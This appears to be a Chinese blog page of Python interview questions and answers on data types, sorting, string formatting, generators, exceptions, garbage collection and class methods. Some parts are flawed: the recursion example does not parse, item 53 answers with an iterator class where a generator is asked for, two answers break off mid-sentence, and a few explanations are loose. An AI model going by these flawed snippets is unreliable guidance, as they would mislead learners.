<h3 id="23、列出-Python-中可变数据类型和不可变数据类型，为什么？"><a href="#23、列出-Python-中可变数据类型和不可变数据类型，为什么？" class="headerlink" title="23、列出 Python 中可变数据类型和不可变数据类型，为什么？"></a>23、列出 Python 中可变数据类型和不可变数据类型，为什么？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、可变数据类型：list、dict、set</span><br><span class="line">2、不可变数据类型：int/float、str、tuple</span><br><span class="line">3、原理：可变数据类型即公用一个内存空间地址，不可变数据类型即每产生一个对象就会产生一个内存地址</span><br></pre></td></tr></table></figure>
<h3 id="24、s-“ajldjlajfdljfddd”，去重并从小到大排序输出”adfjl”？"><a href="#24、s-“ajldjlajfdljfddd”，去重并从小到大排序输出”adfjl”？" class="headerlink" title="24、s = “ajldjlajfdljfddd”，去重并从小到大排序输出”adfjl”？"></a>24、s = “ajldjlajfdljfddd”，去重并从小到大排序输出”adfjl”？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s1 = &quot;ajldjlajfdljfddd&quot;</span><br><span class="line">print(&apos;&apos;.join(sorted(set(s1))))  # adfjl</span><br></pre></td></tr></table></figure>
<h3 id="25、set"><a href="#25、set" class="headerlink" title="25、set"></a>25、set</h3><p><code>set() 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。</code><br><code>class set([iterable])</code></p>
<h3 id="26、join"><a href="#26、join" class="headerlink" title="26、join"></a>26、join</h3><p><code>Python join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。</code><br><code>str.join(sequence)</code>  注意： str 是来链接符号；sequence 是列表</p>
<h3 id="27、用-lambda-函数实现两个数相乘？"><a href="#27、用-lambda-函数实现两个数相乘？" class="headerlink" title="27、用 lambda 函数实现两个数相乘？"></a>27、用 lambda 函数实现两个数相乘？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mul = lambda x, y: x*y</span><br><span class="line">print(mul(2, 4))  # 8</span><br></pre></td></tr></table></figure>
<h3 id="28、sort"><a href="#28、sort" class="headerlink" title="28、sort"></a>28、sort</h3><p>sort() 函数用于对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list.sort(cmp=None, key=None, reverse=False)</span><br><span class="line">参数</span><br><span class="line">cmp -- 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</span><br><span class="line">key -- 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</span><br><span class="line">reverse -- 排序规则，reverse = True 降序， reverse = False 升序（默认）。</span><br></pre></td></tr></table></figure></p>
<h3 id="29、字典根据键从小到大排序？"><a href="#29、字典根据键从小到大排序？" class="headerlink" title="29、字典根据键从小到大排序？"></a>29、字典根据键从小到大排序？</h3><p>注意：key=lambda x: x[0]) 删了的话结果也对。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info = &#123;&apos;name&apos;: &apos;Gage&apos;, &apos;age&apos;: 25, &apos;sex&apos;: &apos;man&apos;&#125;</span><br><span class="line">print(sorted(info.items(), key=lambda x: x[0]))</span><br><span class="line"># [(&apos;age&apos;, 25), (&apos;name&apos;, &apos;Gage&apos;), (&apos;sex&apos;, &apos;man&apos;)]</span><br></pre></td></tr></table></figure></p>
<h3 id="30、Python-获取当前日期？"><a href="#30、Python-获取当前日期？" class="headerlink" title="30、Python 获取当前日期？"></a>30、Python 获取当前日期？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line">print(datetime.datetime.now())</span><br><span class="line">print(time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;))</span><br></pre></td></tr></table></figure>
<p><a href="https://www.runoob.com/python/python-date-time.html" target="_blank" rel="noopener">参考链接</a></p>
<h3 id="31、Python-format-格式化函数"><a href="#31、Python-format-格式化函数" class="headerlink" title="31、Python format 格式化函数"></a>31、Python format 格式化函数</h3><p>它增强了字符串格式化的功能。<br>基本语法是通过 {} 和 : 来代替以前的 % 。<br>format 函数可以接受不限个参数，位置可以不按顺序。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)    # 不设置指定位置，按默认顺序</span><br><span class="line">&apos;hello world&apos;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)  # 设置指定位置</span><br><span class="line">&apos;hello world&apos;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)  # 设置指定位置</span><br><span class="line">&apos;world hello world&apos;</span><br><span class="line">print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(name=&quot;菜鸟教程&quot;, url=&quot;www.runoob.com&quot;))</span><br><span class="line"></span><br><span class="line">通过字典设置参数</span><br><span class="line">site = &#123;&quot;name&quot;: &quot;菜鸟教程&quot;, &quot;url&quot;: &quot;www.runoob.com&quot;&#125;</span><br><span class="line">print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(**site))</span><br><span class="line"> </span><br><span class="line">通过列表索引设置参数</span><br><span class="line">my_list = [&apos;菜鸟教程&apos;, &apos;www.runoob.com&apos;]</span><br><span class="line">print(&quot;网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;&quot;.format(my_list))  # &quot;0&quot; 是必须的</span><br></pre></td></tr></table></figure></p>
<p><a href="https://www.runoob.com/python/att-string-format.html" target="_blank" rel="noopener">参考链接</a></p>
<h3 id="32、偏函数是个啥"><a href="#32、偏函数是个啥" class="headerlink" title="32、偏函数是个啥"></a>32、偏函数是个啥</h3><p>偏函数是从Python2.5引入的一个概念，通过functools模块被用户调用。</p>
<p>偏函数是将所要承载的函数作为partial()函数的第一个参数，原函数的各个参数依次作为partial()函数后续的参数，除非使用关键字参数。<br><a href="https://www.runoob.com/w3cnote/python-partial.html" target="_blank" rel="noopener">参考资料</a></p>
<h3 id="33、例举五条-PEP8-规范"><a href="#33、例举五条-PEP8-规范" class="headerlink" title="33、例举五条 PEP8 规范"></a>33、例举五条 PEP8 规范</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">不要在行尾加分号, 也不要用分号将两条命令放在同一行</span><br><span class="line">不要使用反斜杠连接行</span><br><span class="line">不要在返回语句或条件语句中使用括号</span><br><span class="line">顶级定义之间空2行, 方法定义之间空1行，顶级定义之间空两行</span><br><span class="line">如果一个类不继承自其它类, 就显式的从object继承</span><br></pre></td></tr></table></figure>
<h3 id="34、装饰器和继承有什么区别"><a href="#34、装饰器和继承有什么区别" class="headerlink" title="34、装饰器和继承有什么区别"></a>34、装饰器和继承有什么区别</h3><p>继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。</p>
<p><a href="https://www.runoob.com/python/python-object.html" target="_blank" rel="noopener">Python 面向对象</a><br><a href="https://www.runoob.com/w3cnote/python-extends-init.html" target="_blank" rel="noopener">Python 子类继承父类构造函数说明</a></p>
<p>Python 函数装饰器：</p>
<p>装饰器(Decorators)是 Python 的一个重要部分。简单地说：他们是修改其他函数的功能的函数。他们有助于让我们的代码更简短，也更Pythonic（Python范儿）。</p>
<p><a href="https://www.runoob.com/w3cnote/python-func-decorators.html" target="_blank" rel="noopener">Python 函数装饰器</a></p>
<p><a href="https://blog.csdn.net/beichen0518/article/details/79530864" target="_blank" rel="noopener">参考资料：Python——装饰器和继承</a></p>
<h3 id="35、Python-语言的运行机制"><a href="#35、Python-语言的运行机制" class="headerlink" title="35、Python 语言的运行机制"></a>35、Python 语言的运行机制</h3><p><img data-src="https://images.gitbook.cn/4408a5a0-4484-11e9-bd1f-43448f7c081f" alt></p>
<h3 id="36、实现-Fibonacci-数列"><a href="#36、实现-Fibonacci-数列" class="headerlink" title="36、实现 Fibonacci 数列"></a>36、实现 Fibonacci 数列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fab(n):</span><br><span class="line">    a, b = 0, 1</span><br><span class="line">    while n:</span><br><span class="line">        yield b</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">        n -= 1</span><br></pre></td></tr></table></figure>
<p><strong>### 37、Python 三目运算</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 若果 a&gt;b 成立  就输出  a-b  否则 a+b</span><br><span class="line">h = a-b if a&gt;b else a+b</span><br></pre></td></tr></table></figure></p>
<h3 id="38、-递归"><a href="#38、-递归" class="headerlink" title="38、 递归"></a>38、 递归</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def digui(n):</span><br><span class="line">if n == 1:</span><br><span class="line">    return 1</span><br><span class="line">else:</span><br><span class="line">    return (n * digui(n-1)</span><br></pre></td></tr></table></figure>
<h3 id="38、统计字符串每个单词出现的次数"><a href="#38、统计字符串每个单词出现的次数" class="headerlink" title="38、统计字符串每个单词出现的次数"></a>38、统计字符串每个单词出现的次数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import Counter</span><br><span class="line">s3 = &quot;kjalfj;ldsjafl;hdsllfdhg;lahfbl;hl;ahlf;h&quot;</span><br><span class="line">print(Counter(s3))</span><br></pre></td></tr></table></figure>
<h3 id="39、filter-函数"><a href="#39、filter-函数" class="headerlink" title="39、filter() 函数"></a>39、filter() 函数</h3><p>filter() 函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。</p>
<p>该接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判，然后返回 True 或 False，最后将返回 True 的元素放到新列表中。</p>
<p>filter(function, iterable)</p>
<p>function – 判断函数。<br>iterable – 可迭代对象。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">过滤出列表中的所有奇数：</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"></span><br><span class="line">newlist = filter(is_odd, [1, 2, 3, 4, 5, 6, 7, 8, 9, 10])</span><br><span class="line">print(newlist)</span><br><span class="line"></span><br><span class="line">过滤出1~100中平方根是整数的数：</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line">def is_sqr(x):</span><br><span class="line">    return math.sqrt(x) % 1 == 0</span><br><span class="line"></span><br><span class="line">newlist = filter(is_sqr, range(1, 101))</span><br><span class="line">print(newlist)</span><br></pre></td></tr></table></figure></p>
<h3 id="40、用-python-删除文件和用-linux-命令删除文件方法"><a href="#40、用-python-删除文件和用-linux-命令删除文件方法" class="headerlink" title="40、用 python 删除文件和用 linux 命令删除文件方法"></a>40、用 python 删除文件和用 linux 命令删除文件方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python：os.remove(文件名)</span><br><span class="line">linux: rm 文件名</span><br></pre></td></tr></table></figure>
<h3 id="41、写一段自定义异常代码"><a href="#41、写一段自定义异常代码" class="headerlink" title="41、写一段自定义异常代码"></a>41、写一段自定义异常代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#自定义异常用raise抛出异常</span><br><span class="line">def fn():</span><br><span class="line">    try:</span><br><span class="line">        for i in range(5):</span><br><span class="line">            if i&gt;2:</span><br><span class="line">                raise Exception(&quot;数字大于2了&quot;)</span><br><span class="line">    except Exception as ret:</span><br><span class="line">        print(ret)</span><br><span class="line">fn()    # 数字大于2了</span><br></pre></td></tr></table></figure>
<h3 id="42、-1-2-3-4-5-6-一行代码展开该列表，得出-1-2-3-4-5-6"><a href="#42、-1-2-3-4-5-6-一行代码展开该列表，得出-1-2-3-4-5-6" class="headerlink" title="42、[[1,2],[3,4],[5,6]]一行代码展开该列表，得出[1,2,3,4,5,6]"></a>42、<code>[[1,2],[3,4],[5,6]]一行代码展开该列表，得出[1,2,3,4,5,6]</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=[[1,2],[3,4],[5,6]]</span><br><span class="line">print([j for i in a for j in i])</span><br></pre></td></tr></table></figure>
<h3 id="43、举例说明异常模块中-try-except-else-finally-的相关意义"><a href="#43、举例说明异常模块中-try-except-else-finally-的相关意义" class="headerlink" title="43、举例说明异常模块中 try except else finally 的相关意义"></a>43、举例说明异常模块中 try except else finally 的相关意义</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try..except..else没有捕获到异常，执行else语句</span><br><span class="line">try..except..finally不管是否捕获到异常，都执行finally语句</span><br></pre></td></tr></table></figure>
<h3 id="44、Zip"><a href="#44、Zip" class="headerlink" title="44、Zip"></a>44、Zip</h3><p>zip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。</p>
<p>如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = [1,2,3]</span><br><span class="line">b = [4,5,6]</span><br><span class="line">c = [4,5,6,7,8]</span><br><span class="line">zipped = zip(a,b)     # 打包为元组的列表 [(1, 4), (2, 5), (3, 6)]</span><br><span class="line">zip(a,c)              # 元素个数与最短的列表一致 [(1, 4), (2, 5), (3, 6)]</span><br><span class="line">zip(*zipped)          # 与 zip 相反，*zipped 可理解为解压，返回二维矩阵式 [(1, 2, 3), (4, 5, 6)]</span><br><span class="line"></span><br><span class="line">list1 = [1, 2, 3, 5]</span><br><span class="line">list2 = [4, 5, 6]</span><br><span class="line">zipped = zip(list1, list2)</span><br><span class="line">print(list(zipped))  # [(1, 4), (2, 5), (3, 6)]</span><br></pre></td></tr></table></figure></p>
<h3 id="45、提高-python-运行效率的方法"><a href="#45、提高-python-运行效率的方法" class="headerlink" title="45、提高 python 运行效率的方法"></a>45、提高 python 运行效率的方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、使用生成器，因为可以节约大量内存</span><br><span class="line">2、循环代码优化，避免过多重复代码的执行</span><br><span class="line">3、核心模块用Cython  PyPy等，提高效率</span><br><span class="line">4、多进程、多线程、协程</span><br><span class="line">5、多个if elif条件判断，可以把最有可能先发生的条件放到前面写，这样可以减少程序判断的次数，提高效率</span><br></pre></td></tr></table></figure>
<h3 id="56、遇到-bug-如何处理"><a href="#56、遇到-bug-如何处理" class="headerlink" title="56、遇到 bug 如何处理"></a>56、遇到 bug 如何处理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、细节上的错误，通过print（）打印，能执行到print（）说明一般上面的代码没有问题，分段检测程序是否有问题，如果是js的话可以alert或console.log</span><br><span class="line">2、如果涉及一些第三方框架，会去查官方文档或者一些技术博客。</span><br><span class="line">3、对于bug的管理与归类总结，一般测试将测试出的bug用teambin等bug管理工具进行记录，然后我们会一条一条进行修改，修改的过程也是理解业务逻辑和提高自己编程逻辑缜密性的方法，我也都会收藏做一些笔记记录。</span><br><span class="line">4、导包问题、城市定位多音字造成的显示错误问题</span><br></pre></td></tr></table></figure>
<h3 id="57、简述多线程、多进程"><a href="#57、简述多线程、多进程" class="headerlink" title="57、简述多线程、多进程"></a>57、简述多线程、多进程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进程是资源（CPU、内存等）分配的基本单位，它是程序执行时的一个实例。</span><br><span class="line">线程是程序执行时的最小单位，它是进程的一个执行流。</span><br><span class="line">进程有自己的独立地址空间，每启动一个进程，系统就会为它分配地址空间，建立数据表来维护代码段、堆栈段和数据段，这种操作非常昂贵</span><br><span class="line">线程是共享进程中的数据的，使用相同的地址空间，因此CPU切换一个线程的花费远比进程要小很多，同时创建一个线程的开销也比进程要小很多</span><br></pre></td></tr></table></figure>
<h3 id="48、IOError、AttributeError、ImportError、IndentationError、IndexError、KeyError、SyntaxError、NameError-分别代表什么异常"><a href="#48、IOError、AttributeError、ImportError、IndentationError、IndexError、KeyError、SyntaxError、NameError-分别代表什么异常" class="headerlink" title="48、IOError、AttributeError、ImportError、IndentationError、IndexError、KeyError、SyntaxError、NameError 分别代表什么异常"></a>48、IOError、AttributeError、ImportError、IndentationError、IndexError、KeyError、SyntaxError、NameError 分别代表什么异常</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IOError：输入输出异常</span><br><span class="line">AttributeError：试图访问一个对象没有的属性</span><br><span class="line">ImportError：无法引入模块或包，基本是路径问题</span><br><span class="line">IndentationError：语法错误，代码没有正确的对齐</span><br><span class="line">IndexError：下标索引超出序列边界</span><br><span class="line">KeyError:试图访问你字典里不存在的键</span><br><span class="line">SyntaxError:Python代码逻辑语法出错，不能执行</span><br><span class="line">NameError:使用一个还未赋予对象的变量</span><br></pre></td></tr></table></figure>
<h3 id="49、列出几种魔法方法并简要介绍用途"><a href="#49、列出几种魔法方法并简要介绍用途" class="headerlink" title="49、列出几种魔法方法并简要介绍用途"></a>49、列出几种魔法方法并简要介绍用途</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__init__:对象初始化方法</span><br><span class="line">__new__:创建对象时候执行的方法，单列模式会用到</span><br><span class="line">__str__:当使用print输出对象的时候，只要自己定义了__str__(self)方法，那么就会打印从在这个方法中return的数据</span><br><span class="line">__del__:删除对象执行的方法</span><br></pre></td></tr></table></figure>
<h3 id="50、上下文管理器-with…as-的实现"><a href="#50、上下文管理器-with…as-的实现" class="headerlink" title="50、上下文管理器 with…as 的实现"></a>50、上下文管理器 with…as 的实现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Close():</span><br><span class="line">    def __init__(self, obj):</span><br><span class="line">        self.obj = obj</span><br><span class="line"></span><br><span class="line">    def __enter__(self):</span><br><span class="line">        return self.obj  # 返回作为as目标</span><br><span class="line"></span><br><span class="line">    def __exit__(self, exc_type, exc_val, exc_tb):</span><br><span class="line">        try:</span><br><span class="line">            self.obj.close()</span><br><span class="line">        except AttributeError:</span><br><span class="line">            print(exc_type)</span><br></pre></td></tr></table></figure>
<h3 id="51、细说上下文管理器"><a href="#51、细说上下文管理器" class="headerlink" title="51、细说上下文管理器"></a>51、细说上下文管理器</h3><p>ContextManager ,上下文是 context 直译的叫法,在程序中用来表示代码执行过程中所处的前后环境。上下文管理器中有 <strong>enter</strong> 和 <strong>exit</strong> 两个方法，以with为例子，<strong>enter</strong> 方法会在执行 with 后面的语句时执行，一般用来处理操作前的内容。比如一些创建对象，初始化等；<strong>exit</strong> 方法会在 with 内的代码执行完毕后执行，一般用来处理一些善后收尾工作，比如文件的关闭，数据库的关闭等。</p>
<p><a href="https://blog.csdn.net/mydistance/article/details/82730014" target="_blank" rel="noopener">with及上下文管理器的原理和应用</a></p>
<h3 id="52、迭代器与生成器"><a href="#52、迭代器与生成器" class="headerlink" title="52、迭代器与生成器"></a>52、迭代器与生成器</h3><p>迭代是Python最强大的功能之一，是访问集合元素的一种方式。<br>迭代器是一个可以记住遍历的位置的对象。<br>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。<br>迭代器有两个基本的方法：iter() 和 next()。<br>字符串，列表或元组对象都可用于创建迭代器：</p>
<p>在 Python 中，使用了 yield 的函数被称为生成器（generator）。<br>跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。<br>在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。<br>调用一个生成器函数，返回的是一个迭代器对象。</p>
<p><a href="https://www.runoob.com/python3/python3-iterator-generator.html" target="_blank" rel="noopener">Python3 迭代器与生成器</a></p>
<h3 id="53、请将-i-for-i-in-range-3-改成生成器"><a href="#53、请将-i-for-i-in-range-3-改成生成器" class="headerlink" title="53、请将[i for i in range(3)]改成生成器"></a>53、请将[i for i in range(3)]改成生成器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class iter():</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.loop = -1</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return self</span><br><span class="line">    def __next__(self):</span><br><span class="line">        if self.loop &gt;= self.data:</span><br><span class="line">            raise StopIteration</span><br><span class="line">        self.loop += 1</span><br><span class="line">        return self.loop</span><br></pre></td></tr></table></figure>
<h3 id="54、请说明-sort-和-sorted-对列表排序的区别"><a href="#54、请说明-sort-和-sorted-对列表排序的区别" class="headerlink" title="54、请说明 sort 和 sorted 对列表排序的区别"></a>54、请说明 sort 和 sorted 对列表排序的区别</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.sort()与sorted()的不同在于，sort是在原位重新排列列表，而sorted()是产生一个新的列表。sorted(L)返回一个排序后的L，不改变原始的L；L.sort()是对原始的L进行操作，调用后原始的L会改变，没有返回值；所以a = a.sort()是错的啦！a = sorted(a)才对。</span><br><span class="line">2.sorted()适用于任何可迭代容器，list.sort()仅支持list（本身就是list的一个方法）</span><br><span class="line">3.基于以上两点，sorted使用频率比list.sort()更高些，所以Python中更高级的排</span><br></pre></td></tr></table></figure>
<h3 id="55、对-foo-5-8-0-4-9-4-20-2-8-2-4-进行排序"><a href="#55、对-foo-5-8-0-4-9-4-20-2-8-2-4-进行排序" class="headerlink" title="55、对 foo = [-5,8,0,4,9,-4,-20,-2,8,2,-4] 进行排序"></a>55、<strong>对 foo = [-5,8,0,4,9,-4,-20,-2,8,2,-4] 进行排序</strong></h3><p>使用 lambda 函数从小到大排序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo = [-5,8,0,4,9,-4,-20,-2,8,2,-4]</span><br><span class="line">res=sorted(foo,key=lambda x:x)      </span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>正数从小到大，负数从大到小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo = [-5,8,0,4,9,-4,-20,-2,8,2,-4]</span><br><span class="line">res=sorted(foo,key=lambda x:(x&lt;0,abs(x)))    </span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p>
<h3 id="56、Python-传参数是传值还是传址？"><a href="#56、Python-传参数是传值还是传址？" class="headerlink" title="56、Python 传参数是传值还是传址？"></a>56、Python 传参数是传值还是传址？</h3><p>Python 中函数参数是引用传递（注意不是值传递）。对于不可变类型（数值型、字符串、元组），因变量不能修改，所以运算不会影响到变量自身；而对于可变类型（列表字典）来说，函数体运算可能会更改传入的参数变量。</p>
<h3 id="57、Python-垃圾回收机制？"><a href="#57、Python-垃圾回收机制？" class="headerlink" title="57、Python 垃圾回收机制？"></a>57、Python 垃圾回收机制？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.引用计数</span><br><span class="line">import sys</span><br><span class="line"># 请在Python解释器下运行  为 2  创建一次 调用一次</span><br><span class="line">str1 = &apos;hello world&apos;</span><br><span class="line">print(sys.getrefcount(str1))</span><br><span class="line">2.分代技术</span><br><span class="line">Python默认定义了三代对象集合，索引数越大，对象存活时间越长</span><br><span class="line">Python中使用了某些启发式算法（heuristics）来加速垃圾回收。例如，越晚创建的对象更有可能被回收。对象被创建之后，垃圾回收器会分配它们所属的代（generation）。每个对象都会被分配一个代，而被分配更年轻代的对象是优先被处理的。</span><br><span class="line">3.引用循环</span><br><span class="line">垃圾回收器会定时寻找这个循环，并将其回收。举个例子，假设有两个对象o1和o2，而且符合o1.x == o2和o2.x == o1这两个条件。如果o1和o2没有其他代码引</span><br></pre></td></tr></table></figure>
<h3 id="58、字典和-json-字符串相互转化方法"><a href="#58、字典和-json-字符串相互转化方法" class="headerlink" title="58、字典和 json 字符串相互转化方法"></a>58、<strong>字典和 json 字符串相互转化方法</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">dic = &#123;&quot;name&quot;:&quot;zs&quot;&#125;</span><br><span class="line">res = json.dumps(dic)</span><br><span class="line">print(res,type(res))</span><br><span class="line">ret = json.loads(res)</span><br><span class="line">print(ret,type(ret))</span><br></pre></td></tr></table></figure>
<h3 id="59、Python-中读取-Excel-文件的方法？"><a href="#59、Python-中读取-Excel-文件的方法？" class="headerlink" title="59、Python 中读取 Excel 文件的方法？"></a>59、Python 中读取 Excel 文件的方法？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas</span><br><span class="line">read_excel = pandas.read_excel(&quot;test.xlsx&quot;)</span><br><span class="line">print(read_excel)</span><br></pre></td></tr></table></figure>
<h3 id="60、输入日期，-判断这一天是这一年的第几天？"><a href="#60、输入日期，-判断这一天是这一年的第几天？" class="headerlink" title="60、输入日期， 判断这一天是这一年的第几天？"></a>60、输入日期， 判断这一天是这一年的第几天？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import datetime</span><br><span class="line">def dayofyear():</span><br><span class="line">    year = input(&quot;请输入年份: &quot;)</span><br><span class="line">    month = input(&quot;请输入月份: &quot;)</span><br><span class="line">    day = input(&quot;请输入天: &quot;)</span><br><span class="line">    date1 = datetime.date(year=int(year),month=int(month),day=int(day))</span><br><span class="line">    date2 = datetime.date(year=int(year),month=1,day=1)</span><br><span class="line">    return (date1-date2).days+1</span><br></pre></td></tr></table></figure>
<h3 id="61、yield-用法"><a href="#61、yield-用法" class="headerlink" title="61、yield 用法"></a>61、yield 用法</h3><p>yield 就是保存当前程序执行状态。你用 for 循环的时候，每次取一个元素的时候就会计算一次。用 yield 的函数叫 generator,和 iterator 一样，它的好处是不用一次计算所有元素，而是用一次算一次，可以节省很多空间，generator 每次计算需要上一次计算结果，所以用 yield,否则一 return，上次计算结果就没了。</p>
<h3 id="62、is-和-的区别"><a href="#62、is-和-的区别" class="headerlink" title="62、is 和 == 的区别"></a>62、is 和 == 的区别</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># is 比较的是内存地址   == 比较内容和数据类型</span><br><span class="line"></span><br><span class="line">a = [1, 2, 3]</span><br><span class="line">b = a</span><br><span class="line">print(a is b)</span><br><span class="line">print(a == b)</span><br><span class="line"></span><br><span class="line">c = copy.deepcopy(a)</span><br><span class="line">print(a is c)</span><br><span class="line">print(a == c)</span><br><span class="line">-------------</span><br><span class="line">True</span><br><span class="line">True</span><br><span class="line">False</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<h3 id="63、python-的-bug-和进行静态的代码分析工具"><a href="#63、python-的-bug-和进行静态的代码分析工具" class="headerlink" title="63、python 的 bug 和进行静态的代码分析工具"></a>63、<strong>python 的 bug 和进行静态的代码分析工具</strong></h3><p>PyChecker 是一个 python 代码的静态分析工具，它可以帮助查找 python 代码的 bug，会对代码的复杂度和格式提出警告 Pylint 是另外一个工具可以进行 codingstandard 检查。</p>
<h3 id="64、Python-如何-copy-一个文件？"><a href="#64、Python-如何-copy-一个文件？" class="headerlink" title="64、Python 如何 copy 一个文件？"></a>64、Python 如何 copy 一个文件？</h3><p>shutil 模块有一个 copyfile 函数可以实现文件拷贝</p>
<h3 id="65、Python-中单下划线和双下划线使用"><a href="#65、Python-中单下划线和双下划线使用" class="headerlink" title="65、Python 中单下划线和双下划线使用"></a>65、Python 中单下划线和双下划线使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__foo__:一种约定,Python内部的名字,用来区别其他用户自定义的命名,以防冲突，就是例如__init__(),__del__(),__call__()这些特殊方法</span><br><span class="line"></span><br><span class="line">_foo:一种约定,用来指定变量私有.程序员用来指定私有变量的一种方式.不能用from module import * 导入，其他方面和公有一样访问；</span><br><span class="line"></span><br><span class="line">__foo:这个有真正的意义:解析器用_classname__foo来代替这个名字,以区别和其他类相同的命名,它无法直接像公有成员一样随便访问,通过对象名._类名__xxx这样的方式可以访问.</span><br></pre></td></tr></table></figure>
<h3 id="66、代码描述静态方法-staticmethod-，类方法-classmethod-和实例方法"><a href="#66、代码描述静态方法-staticmethod-，类方法-classmethod-和实例方法" class="headerlink" title="66、代码描述静态方法 (staticmethod)，类方法(classmethod) 和实例方法"></a>66、代码描述静态方法 (staticmethod)，类方法(classmethod) 和实例方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def foo(x):</span><br><span class="line">        print &quot;executing foo(%s)&quot;%(x)</span><br><span class="line"></span><br><span class="line">    class A(object):</span><br><span class="line">        def foo(self,x):</span><br><span class="line">            print &quot;executing foo(%s,%s)&quot;%(self,x)</span><br><span class="line"></span><br><span class="line">        @classmethod</span><br><span class="line">        def class_foo(cls,x):</span><br><span class="line">            print &quot;executing class_foo(%s,%s)&quot;%(cls,x)</span><br><span class="line"></span><br><span class="line">        @staticmethod</span><br><span class="line">        def static_foo(x):</span><br><span class="line">            print &quot;executing static_foo(%s)&quot;%x</span><br><span class="line"></span><br><span class="line">    a=A()</span><br></pre></td></tr></table></figure>
<h3 id="67、新式类和旧式类的区别？"><a href="#67、新式类和旧式类的区别？" class="headerlink" title="67、新式类和旧式类的区别？"></a>67、新式类和旧式类的区别？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a. 在python里凡是继承了object的类，都是新式类</span><br><span class="line">b. Python3里只有新式类</span><br><span class="line">c. Python2里面继承object的是新式类，没有写父类的是经典类</span><br><span class="line">d. 经典类目前在Python里基本没有应用</span><br></pre></td></tr></table></figure>
